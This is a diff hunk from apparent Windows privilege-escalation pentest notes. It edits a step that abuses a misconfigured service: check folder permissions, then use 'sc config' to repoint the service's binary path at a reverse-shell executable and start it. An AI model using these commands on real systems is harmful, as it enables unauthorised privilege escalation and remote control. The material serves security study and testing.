@@ -1003,7 +1003,7 @@ PS> net start KiteService
 #Identify service from winpeas
 icalcs "path" #F means full permission, we need to check we have full access on folder
 sc qc <servicename> #find binarypath variable
-sc config <service> <option>="<value>" #change the path to the reverseshell location
+sc config <service> binpath= "\"C:\Users\Public\temp\rev.exe\"" #change the path to the reverseshell location
 sc start <servicename>
 ```
 
